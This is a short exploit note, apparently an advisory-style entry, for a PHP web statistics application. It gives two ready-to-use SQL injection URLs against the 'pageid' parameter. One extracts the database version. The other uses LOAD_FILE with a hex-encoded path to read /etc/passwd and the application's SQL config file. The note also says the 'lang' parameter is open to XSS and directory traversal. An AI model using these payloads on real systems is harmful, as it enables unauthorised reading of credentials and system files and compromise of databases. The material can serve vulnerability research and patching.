exemple of exploitation :
1)http://site.com/index.php?mode=stats&sid=THE_WEB_SITE_SID_HERE&show=page&pageid=-32+union+select+1,@@version/*

2)http://site.com/index.php?mode=stats&sid=THE_WEB_SITE_SID_HERE&show=page&pageid=-32+union+select+1,LOAD_FILE(0x2F6574632F706173737764)/*
--> load some file as /etc/passwd or /path/www/stats/Php/config_sql.php

?lang= is also vulnerable to xss attacks, and as Hamid Ebadi has mention $lang is also vulnerable to directory transversal
